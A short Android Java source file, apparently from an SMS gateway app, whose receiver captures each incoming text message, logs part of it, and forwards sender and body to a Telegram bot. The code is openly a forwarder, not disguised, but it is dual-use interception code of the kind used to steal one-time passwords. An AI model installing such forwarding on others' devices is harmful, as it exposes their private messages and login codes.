package com.motionsms.gateway;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "MotionSMSSmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        try {
            Object[] pdus = (Object[]) bundle.get("pdus");
            String format  = bundle.getString("format");
            if (pdus == null || pdus.length == 0) return;

            // Multi-part SMS একসাথে জোড়া লাগাও
            StringBuilder fullMessage = new StringBuilder();
            String sender = "";

            for (Object pdu : pdus) {
                SmsMessage sms;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }
                if (sms != null) {
                    sender = sms.getDisplayOriginatingAddress();
                    fullMessage.append(sms.getMessageBody());
                }
            }

            String message = fullMessage.toString().trim();
            Log.i(TAG, "SMS received from: " + sender + " | Message: " + message.substring(0, Math.min(50, message.length())));

            // Telegram Bot এ forward করো
            GatewayService.sendSmsToBot(context, sender, message);

        } catch (Exception e) {
            Log.e(TAG, "Error processing SMS: " + e.getMessage());
        }
    }
}
